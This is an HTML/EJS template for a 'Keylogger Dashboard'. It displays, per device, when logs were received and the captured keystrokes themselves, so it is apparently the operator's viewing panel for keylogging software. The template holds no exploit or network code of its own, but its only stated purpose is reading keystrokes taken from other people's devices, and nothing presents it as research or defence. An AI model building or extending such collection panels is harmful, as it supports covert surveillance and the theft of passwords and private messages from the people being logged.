<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Keylogger Dashboard</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f4f7fa;
      color: #333;
      margin: 0;
      padding: 20px;
    }
    h1 {
      text-align: center;
      color: #2c3e50;
    }
    .container {
      max-width: 1200px;
      margin: 0 auto;
      background: white;
      padding: 25px;
      border-radius: 10px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
    }
    th, td {
      padding: 12px 15px;
      text-align: left;
      border-bottom: 1px solid #ddd;
    }
    th {
      background-color: #3498db;
      color: white;
    }
    tr:hover {
      background-color: #f1f1f1;
    }
    .logs-cell {
      white-space: pre-wrap;
      word-wrap: break-word;
      max-width: 600px;
      font-family: 'Courier New', Courier, monospace;
      font-size: 14px;
    }
    .timestamp {
      color: #7f8c8d;
      font-size: 0.9em;
    }
    .no-data {
      text-align: center;
      color: #95a5a6;
      padding: 40px;
      font-style: italic;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Keylogger Dashboard</h1>
    
    <% if (logs.length === 0) { %>
      <p class="no-data">No logs received yet.</p>
    <% } else { %>
      <table>
        <thead>
          <tr>
            <th>Device ID</th>
            <th>Received At</th>
            <th>Log Timestamp (first entry)</th>
            <th>Keystrokes / Logs</th>
          </tr>
        </thead>
        <tbody>
          <% logs.forEach(log => { %>
            <tr>
              <td><%= log.device %></td>
              <td class="timestamp"><%= log.received_at %></td>
              <td class="timestamp"><%= log.timestamp || 'N/A' %></td>
              <td class="logs-cell"><%= log.logs %></td>
            </tr>
          <% }) %>
        </tbody>
      </table>
    <% } %>
  </div>
</body>
</html>